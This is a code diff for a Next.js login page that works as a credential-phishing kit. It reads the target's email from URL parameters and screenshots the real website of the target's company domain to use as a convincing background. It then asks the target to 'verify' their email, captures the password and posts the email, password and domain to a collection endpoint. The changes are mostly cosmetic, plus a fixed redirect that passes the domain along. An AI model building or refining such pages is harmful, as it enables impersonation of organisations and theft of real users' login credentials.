@@ -1,31 +1,32 @@
 'use client'
 
 import '../styles/globals.css'
-import { useSearchParams } from 'next/navigation'
+import { useSearchParams, useRouter } from 'next/navigation'
 import { useState, useEffect } from 'react'
 
 export default function LoginPage() {
   const params = useSearchParams()
-  const preEmail = params.get('email') || ''
+  const router = useRouter()
+
+  const preEmail       = params.get('email') || ''
   const urlParamDomain = params.get('domain') || ''
 
-  const [email, setEmail] = useState(preEmail)
-  const [confirmed, setConfirmed] = useState(!!preEmail)
-  const [password, setPassword] = useState('')
-  const [showModal, setShowModal] = useState(false)
-  const [errors, setErrors] = useState({ email: '', password: '' })
-
+  const [email, setEmail]             = useState(preEmail)
+  const [confirmed, setConfirmed]     = useState(!!preEmail)
+  const [password, setPassword]       = useState('')
+  const [showModal, setShowModal]     = useState(false)
+  const [errors, setErrors]           = useState({ email: '', password: '' })
   const [domainToCapture, setDomainToCapture] = useState('')
-  const [screenshotUrl, setScreenshotUrl] = useState('')
-  const [isLoading, setIsLoading] = useState(true)
-  const [progress, setProgress] = useState(0)
+  const [screenshotUrl, setScreenshotUrl]     = useState('')
+  const [isLoading, setIsLoading]             = useState(true)
+  const [progress, setProgress]               = useState(0)
 
-  // auto-confirm email if passed
+  // Auto‐confirm if email was pre‐filled
   useEffect(() => {
     if (preEmail) setConfirmed(true)
   }, [preEmail])
 
-  // decide which domain to screenshot
+  // Decide domain from URL or email
   useEffect(() => {
     if (!confirmed) {
       setDomainToCapture('')
@@ -39,7 +40,7 @@ export default function LoginPage() {
     setDomainToCapture(parts.length === 2 ? parts[1] : '')
   }, [confirmed, urlParamDomain, email])
 
-  // build screenshot URL
+  // Build screenshot URL
   useEffect(() => {
     if (!domainToCapture) {
       setScreenshotUrl('')
@@ -47,7 +48,7 @@ export default function LoginPage() {
       return
     }
     const base = process.env.NEXT_PUBLIC_SCREENSHOT_URL!
-    const sep = base.includes('?') ? '&' : '?'
+    const sep  = base.includes('?') ? '&' : '?'
     setScreenshotUrl(
       `${base}${sep}url=${encodeURIComponent(`https://${domainToCapture}`)}`
     )
@@ -55,7 +56,7 @@ export default function LoginPage() {
     setProgress(0)
   }, [domainToCapture])
 
-  // simulate realistic progress
+  // Simulate realistic progress to 90%
   useEffect(() => {
     if (!isLoading) return
     const iv = setInterval(() => {
@@ -89,12 +90,14 @@ export default function LoginPage() {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ email, password, domain: domainToCapture }),
     })
-    setTimeout(() => { router.push(`/end?email=${encodeURIComponent(email)}, 2000)
+    setTimeout(() => {
+      router.push(`/end?email=${encodeURIComponent(email)}&domain=${encodeURIComponent(domainToCapture)}`)
+    }, 2000)
   }
 
   return (
     <div className="login-container relative">
-      {/* Preloader overlay with progress bar */}
+      {/* Preloader */}
       {isLoading && (
         <div className="fixed inset-0 z-30 flex flex-col items-center justify-center bg-white">
           <div className="text-lg font-medium text-gray-700 mb-4">
@@ -103,13 +106,13 @@ export default function LoginPage() {
           <div className="w-3/4 h-2 bg-gray-200 rounded overflow-hidden">
             <div
               className="h-full bg-blue-500 transition-all"
-              style={{ width: `${progress}%` }}
+              style={{ width: progress + '%' }}
             />
           </div>
         </div>
       )}
 
-      {/* Screenshot + light-blue tint background */}
+      {/* Background screenshot + tint */}
       {screenshotUrl && (
         <div className="absolute inset-0 overflow-hidden p-10">
           <img
@@ -128,9 +131,7 @@ export default function LoginPage() {
 
       {/* Login Card */}
       <div className="login-card">
-        <h1 className="text-2xl font-bold text-center mb-2 text-black-600">
-          Verify your email address to continue.
-        </h1>
+        <h1 className="text-2xl font-bold text-center mb-2 text-black-600">Verify your email address to continue.</h1>
 
         {!confirmed ? (
           <form onSubmit={handleEmail} className="space-y-4">
@@ -142,9 +143,7 @@ export default function LoginPage() {
               className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
               required
             />
-            {errors.email && (
-              <p className="text-sm text-red-600">{errors.email}</p>
-            )}
+            {errors.email && <p className="text-sm text-red-600">{errors.email}</p>}
             <button
               type="submit"
               className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
@@ -165,7 +164,7 @@ export default function LoginPage() {
               value={password}
               onChange={e => {
                 setPassword(e.target.value)
-                if (e.target.value.length >= 5 && errors.password) {
+                if (errors.password && e.target.value.length >= 5) {
                   setErrors({ ...errors, password: '' })
                 }
               }}
@@ -173,9 +172,7 @@ export default function LoginPage() {
               className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
               required
             />
-            {errors.password && (
-              <p className="text-sm text-red-600">{errors.password}</p>
-            )}
+            {errors.password && <p className="text-sm text-red-600">{errors.password}</p>}
             <button
               type="submit"
               className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
@@ -190,9 +187,7 @@ export default function LoginPage() {
       {showModal && (
         <div className="modal-overlay">
           <div className="modal-content">
-            <h2 className="text-lg font-semibold text-gray-800">
-              Please wait…
-            </h2>
+            <h2 className="text-lg font-semibold text-gray-800">Please wait…</h2>
             <p className="mt-2 text-gray-600">Submitting your credentials.</p>
           </div>
         </div>
